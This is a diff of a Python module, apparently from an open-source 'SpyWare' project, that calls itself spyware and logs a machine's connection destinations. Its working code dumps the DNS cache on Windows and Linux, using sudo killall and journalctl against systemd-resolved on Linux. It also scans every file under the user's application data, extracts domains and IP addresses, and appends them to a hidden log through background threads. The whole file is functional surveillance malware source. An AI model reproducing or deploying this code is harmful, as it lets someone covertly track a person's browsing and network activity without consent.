@@ -1,11 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-""" This file implement a SpyWare to get all connection destination. """
-
 ###################
-#    This file implement a SpyWare to get all connection destination.
-#    Copyright (C) 2021  Maurice Lambert
+#    This file implements a SpyWare for connection destinations.
+#    Copyright (C) 2021, 2022  Maurice Lambert
 
 #    This program is free software: you can redistribute it and/or modify
 #    it under the terms of the GNU General Public License as published by
@@ -21,237 +19,375 @@
 #    along with this program.  If not, see <https://www.gnu.org/licenses/>.
 ###################
 
-__all__ = ["Daemon", "main", "CacheDNS", "CacheBrowser", "config_load"]
+"""
+This file implements a SpyWare for connection destinations.
 
-from os import path, environ, device_encoding, environ
+~# python3 DomainsLogger.py domainsSpy.conf
+
+>>> from os import environ
+>>> environ['domainsSpy.conf'] = 'domainsSpy.conf'
+>>> from SpyWare.DomainsLogger import domainsSpy
+>>> domainsSpy()                  # (using env) OR
+>>> domainsSpy('domainsSpy.conf') # (using config file name) OR
+>>> domainsSpy(argv=["DomainsLogger.py", "domainsSpy.conf"]) # (using argv)
+"""
+
+__version__ = "1.0.0"
+__author__ = "Maurice Lambert"
+__author_email__ = "mauricelambert434@gmail.com"
+__maintainer__ = "Maurice Lambert"
+__maintainer_email__ = "mauricelambert434@gmail.com"
+__description__ = """
+This file implements a complete spyware.
+"""
+license = "GPL-3.0 License"
+__url__ = "https://github.com/mauricelambert/SpyWare"
+
+copyright = """
+SpyWare  Copyright (C) 2021, 2022  Maurice Lambert
+This program comes with ABSOLUTELY NO WARRANTY.
+This is free software, and you are welcome to redistribute it
+under certain conditions.
+"""
+__license__ = license
+__copyright__ = copyright
+
+__all__ = ["Daemon", "main", "CacheDNS", "CacheAppData", "config_load"]
+
+from os.path import join, expanduser, isdir, isfile, dirname, exists
+from os import device_encoding, environ, stat, access, R_OK
+from re import compile as cregex, Pattern
 from configparser import ConfigParser
+from collections.abc import Iterator
 from subprocess import Popen, PIPE
+from mmap import mmap, ACCESS_READ
+from threading import Thread, Lock
+from traceback import print_exc
+from io import TextIOWrapper
+from typing import List, Set
 from platform import system
-from re import finditer
+from sys import argv, exit
 from time import sleep
 from glob import iglob
-from enum import Enum
-from sys import argv
 
 
-def config_load(filename: str=None) -> None:
+class CONFIGURATIONS:
 
-    """ This function load the config file. """
+    """
+    This class contains configurations.
+    """
 
-    global Constantes
+    IS_WINDOWS = system() == "Windows"
+    string_regex_domain: str = (
+        r"([a-zA-Z0-9]([-_]?[a-zA-Z0-9]){0,62}\.)*"
+        r"[a-zA-Z0-9]([-_]?[a-zA-Z0-9]){0,62}\.[a-zA-Z]{2,5}"
+    ).encode()
+    string_regex_ip: str = r"([0-9]{1,3}[.]){3}[0-9]{1,3}".encode()
+
+    regex_domain: Pattern = cregex(string_regex_domain)
+    regex_ip: Pattern = cregex(string_regex_ip)
+
+    save_filename: str = "domains.txt"
+
+    if IS_WINDOWS:
+        commandes = (("ipconfig", "/displaydns"),)
+        appdata_path = join(environ["APPDATA"], "..")
+    else:
+        commandes = (
+            ("strings", "/var/cache/nscd/hosts"),
+            ("sudo", "killall", "-USR1", "systemd-resolved"),
+            ("sudo", "journalctl", "-u", "systemd-resolved"),
+        )
+        appdata_path = join(expanduser("~"), ".locals")
+
+    interval_DNS: float = 600
+    interval_appdata: float = 86400
+    interval_reading_file: float = 0.5
+    interval_domain: float = 0.5
+
+
+def config_load(filename: str = None, argv: List[str] = argv) -> int:
+
+    """
+    This function loads the configuration using a the configuration file.
+    """
 
     CONFIG = ConfigParser()
-    env_conf_file = environ.get("domainsSpy.conf")
 
-    if filename is not None:
+    default_file_name = "domainsSpy.conf"
+    default_file_path = join(dirname(__file__), default_file_name)
+    env_config_file = environ.get(default_file_name)
+    arg_config_file = argv[1] if len(argv) == 2 else None
+
+    if filename is not None and exists(filename):
         CONFIG.read(filename)
-    elif len(argv) == 2:
-        CONFIG.read(argv[1])
-    elif env_conf_file:
-        CONFIG.read(env_conf_file)
+    elif arg_config_file is not None and exists(arg_config_file):
+        CONFIG.read(arg_config_file)
+    elif env_config_file and exists(env_config_file):
+        CONFIG.read(env_config_file)
+    elif exists(default_file_path):
+        CONFIG.read(default_file_path)
     else:
-        CONFIG.read(
-            path.join(
-                path.dirname(__file__), "domainsSpy.conf"
-            )
-        )
+        return 1
 
-
-    class Constantes(Enum):
-
-        regex_domain = "[a-zA-Z0-9][a-zA-Z0-9-_]{0,61}[a-zA-Z0-9]{0,1}\.([a-zA-Z]{1,6}|[a-zA-Z0-9-]{1,30}\.[a-zA-Z]{2,4})"
-        regex_ip = "([0-9]{1,3}[.]){3}[0-9]{0,3}"
-
-        save_filename = CONFIG["SAVE"]["filename"]
-
-        if system() == "Windows":
-            commandes = (["ipconfig", "/displaydns"],)
-            browser_directories = path.join(environ["APPDATA"], "..")
-        else:
-            commandes = (
-                ["strings", "/var/cache/nscd/hosts"],
-                ["sudo", "killall", "-USR1", "systemd-resolved"],
-                ["sudo", "journalctl", "-u", "systemd-resolved"],
-            )
-            browser_directories = path.join(path.expandser("~"), ".locals")
-
-        timeDns: float = CONFIG.getfloat("TIME", "dnsSleep")
-        timeBrowser: float = CONFIG.getfloat("TIME", "browserSleep")
-        timeBetweenReadingFile: float = CONFIG.getfloat("TIME", "readingFileSleep")
-        timeBetweenGetDomain: float = CONFIG.getfloat("TIME", "getDomainSleep")
+    CONFIG = CONFIG.__dict__["_sections"]
+    CONFIGURATIONS.save_filename = CONFIG.get("SAVE", {}).get(
+        "filename", "domains.txt"
+    )
+    CONFIGURATIONS.interval_DNS = float(
+        CONFIG.get("TIME", {}).get("interval_dns", "600")
+    )
+    CONFIGURATIONS.interval_appdata = float(
+        CONFIG.get("TIME", {}).get("interval_appdata", "86400")
+    )
+    CONFIGURATIONS.interval_reading_file = float(
+        CONFIG.get("TIME", {}).get("interval_reading_file", "0.5")
+    )
+    CONFIGURATIONS.interval_domain = float(
+        CONFIG.get("TIME", {}).get("interval_domain", "0.5")
+    )
+    return 0
 
 
 class Daemon:
 
-    """ This class launch DNS this script as service for ever. """
+    """
+    This class implements a loop to get connection destinations.
+    """
 
     def __init__(self):
-        self.timeBrowser = Constantes.timeBrowser.value
-        self.timeDns = Constantes.timeDns.value
-        self.cacheAppData = CacheBrowser()
+        self.interval_appdata = CONFIGURATIONS.interval_appdata
+        self.interval_dns = CONFIGURATIONS.interval_DNS
+        self.cacheAppData = CacheAppData()
         self.cacheDns = CacheDNS()
+        self.lock = Lock()
         self.run = True
+
+        filename = self.filename = CONFIGURATIONS.save_filename
+        create_if_not_exists(filename)
+        self.data_file = open(filename)
+        self.data = []
 
     def run_CacheDns(self) -> None:
 
-        """ This function launch the loop to get DnsCache. """
+        """
+        This function implements the loop to get destinations
+        in DNS cache.
+        """
 
-        create_file()
+        get_data_to_save = self.get_data_to_save
+        persistent_save = self.persistent_save
+        interval = self.interval_dns
+        cacheDns = self.cacheDns
+        research = cacheDns.research
+        launch = cacheDns.launch
+        counter = 0
 
         while self.run:
-            self.cacheDns.launch()
-            self.cacheDns.research()
-            self.cacheDns.save()
+            launch()
+            get_data_to_save(research())
+            counter += 1
+
+            if counter >= 3:
+                persistent_save()
+                counter = 0
+
             if self.run:
-                sleep(self.timeDns)
+                sleep(interval)
 
     def run_AppData(self) -> None:
 
-        """ This function launch the loop to get BrowserCache. """
+        """
+        This function implements the loop to get destinations
+        is Application data.
+        """
 
-        create_file()
+        interval = self.interval_appdata
+        path = CONFIGURATIONS.appdata_path
+        domains_generator = self.cacheAppData.domains_generator
+        get_data_to_save = self.get_data_to_save
 
         while self.run:
-            self.cacheAppData.get_filenames(
-                path.join(Constantes.browser_directories.value, "..")
-            )
+            for domains in domains_generator(path):
+                get_data_to_save(domains)
+
             if self.run:
-                sleep(self.timeBrowser)
+                sleep(interval)
+
+    def get_data_to_save(self, domains: Set[bytes]) -> None:
+
+        """
+        This function saves domain if isn't save before.
+        """
+
+        domains = [domain + b"\n" for domain in domains]
+        lock = self.lock
+        lock.acquire()
+
+        data_file = self.data_file
+        data_file.seek(0)
+        readline = data_file.readline
+
+        data = readline()
+
+        while data:
+            for domain in domains:
+                if domain == data:
+                    domains.remove(domain)
+            data = readline()
+
+        if domains:
+            self.data.extend(domains)
+
+        lock.release()
+
+    def persistent_save(self) -> None:
+
+        """
+        This function write IPs or domains if not in file.
+        """
+
+        lock = self.lock
+        lock.acquire()
+        self.data_file.close()
+        filename = self.filename
+
+        with open(filename, "ab") as file:
+            file.write(b"".join(self.data))
+
+        self.data_file = open(filename, "rb")
+        self.data = []
+        lock.release()
 
 
 class CacheDNS:
 
-    """ This class get DNS cache and find all domains and IP. """
+    """
+    This class gets and extract domains and IPs the DNS cache.
+    """
 
     def __init__(self):
-        self.commandes = Constantes.commandes.value
+        self.extract_domains = CONFIGURATIONS.regex_domain.finditer
+        self.extract_ip = CONFIGURATIONS.regex_ip.finditer
+        self.commandes = CONFIGURATIONS.commandes
         self.process = None
+        self.domains = []
         self.out = None
         self.ip = []
-        self.domains = []
 
     def launch(self) -> None:
 
-        """ This function execute the command to get DNS cache. """
+        """
+        This function execute commands to get DNS cache.
+        """
 
-        self.out = ""
-        errors = ""
+        out = self.out = []
+        o_append = out.append
+
+        errors = self.errors = []
+        e_append = errors.append
+
         for commande in self.commandes:
-            self.process = Popen(commande, stdout=PIPE, stderr=PIPE)
-            out, err = self.process.communicate()
-            self.out += out.decode(device_encoding(0))
-            errors += err.decode(device_encoding(0))
+            process = Popen(commande, stdout=PIPE, stderr=PIPE)
+            out_, err = process.communicate()
+            o_append(out_)
+            if err:
+                e_append(err)
 
-        if errors or self.process.returncode:
-            print(f"Error: {err}")
+        self.out = b"".join(out)
 
-    def research(self) -> None:
+        returncode = process.returncode
+        if errors or returncode:
+            print(f"ExitCode: {returncode}\nError: {b''.join(errors)}")
 
-        """ This function research IP and domains from stdout. """
+    def research(self) -> List[bytes]:
 
-        for ip in finditer(Constantes.regex_ip.value, self.out):
-            sleep(Constantes.timeBetweenGetDomain.value)
-            self.ip.append(ip.group())
+        """
+        This function extracts IPs and domains from commands line results.
+        """
 
-        for domain in finditer(Constantes.regex_domain.value, self.out):
-            sleep(Constantes.timeBetweenGetDomain.value)
-            self.domains.append(domain.group())
-
-    def save(self):
-
-        """ This function save ip and domains. """
-
-        write_if_not_in_file(*(self.domains + self.ip))
+        return set(
+            [m.group() for m in self.extract_ip(self.out)]
+            + [m.group() for m in self.extract_domains(self.out)]
+        )
 
 
-class CacheBrowser:
+class CacheAppData:
 
-    """ This class get domains and IP in Browser and Application cache. """
+    """
+    This class gets and extract domains and IPs from applications cache.
+    """
 
     def __init__(self):
         self.data = None
         self.temp_data = None
-        self.regex_ip = Constantes.regex_ip.value.encode()
-        self.regex_domain = Constantes.regex_domain.value.encode()
-        self.save_filename = Constantes.save_filename.value
-        self.time_between_reading_file = Constantes.timeBetweenReadingFile.value
+        self.extract_ip = CONFIGURATIONS.regex_ip.finditer
+        self.extract_domain = CONFIGURATIONS.regex_domain.finditer
+        self.interval_reading_file = CONFIGURATIONS.interval_reading_file
 
-    def save(self, *data) -> None:
+    def domains_generator(self, directory: str) -> Iterator[List[bytes]]:
 
-        """ This function save data. """
+        """
+        This function get recursives filenames.
+        """
 
-        with open(self.save_filename) as file:
-            self.data = file.read()
+        interval = self.interval_reading_file
+        domains_generator = self.domains_generator
+        get_data = self.get_data
 
-        file = open(self.save_filename, "a")
-        for domain in data:
-            domain = domain.decode()
-            if domain not in self.data:
-                file.write(domain + "\n")
-                self.data += domain + "\n"
-        file.close()
-
-        self.data = None
-
-    def get_filenames(self, directory: str) -> None:
-
-        """ This function get recursives filenames. """
-
-        for filename in iglob(path.join(directory, "*")):
-            if path.isdir(filename):
-                self.get_filenames(path.join(directory, filename))
-            elif path.isfile(filename):
+        for filename in iglob(join(directory, "*")):
+            if isdir(filename):
+                yield from domains_generator(join(directory, filename))
+            elif isfile(filename):
                 try:
-                    self.get_data(path.join(directory, filename))
-                except Exception as e:
-                    print(e)
-                sleep(self.time_between_reading_file)
+                    yield get_data(join(directory, filename))
+                except Exception:
+                    print_exc()
+                sleep(interval)
 
     def get_data(self, filename: str) -> None:
 
-        """ This function get domain and IP from data file. """
+        """
+        This function get domain and IP from data file.
+        """
 
-        with open(filename, "rb") as file:
-            data = file.read()
+        size = stat(filename).st_size
 
-        datas = []
-        for ip in finditer(self.regex_ip, data):
-            sleep(Constantes.timeBetweenGetDomain.value)
-            datas.append(ip.group())
+        if access(filename, R_OK):
+            file = open(filename)
+        else:
+            return []
 
-        for domain in finditer(self.regex_domain, data):
-            sleep(Constantes.timeBetweenGetDomain.value)
-            datas.append(domain.group())
-
-        self.save(*datas)
-
-
-def create_file():
-
-    """ This function create the file to save if is not exist. """
-
-    if not path.exists(Constantes.save_filename.value):
-        with open(Constantes.save_filename.value, "w") as file:
-            file.write("")
-
-def write_if_not_in_file(*list_to_write) -> None:
-
-    """ This function write data if this data is not in file. """
-
-    with open(Constantes.save_filename.value, "r") as file:
-        texte = file.read()
-
-    with open(Constantes.save_filename.value, "a") as file:
-        for element in list_to_write:
-            if element not in texte:
-                file.write(element + "\n")
-                texte += element + "\n"
+        if size:
+            data = mmap(file.fileno(), size, access=ACCESS_READ)
+            found = [m.group() for m in self.extract_ip(data)] + [
+                m.group() for m in self.extract_domain(data)
+            ]
+        else:
+            found = []
+        file.close()
+        return found
 
 
-def main() -> None:
-    from threading import Thread
+def create_if_not_exists(filename: str) -> None:
 
-    config_load()
+    """
+    This function creates file if not exists.
+    """
+
+    if not exists(filename):
+        file = open(filename, "w")
+        file.write("")
+        file.close()
+
+
+def main(config_filename: str = None, argv: List[str] = argv) -> int:
+
+    """
+    This function executes the file from the command line.
+    """
+
+    config_load(filename=config_filename, argv=argv)
 
     daemon = Daemon()
     thread = Thread(target=daemon.run_CacheDns)
@@ -262,6 +398,9 @@ def main() -> None:
         daemon.run = False
 
     thread.join()
+    return 0
+
 
 if __name__ == "__main__":
-    main()
+    print(copyright)
+    exit(main())
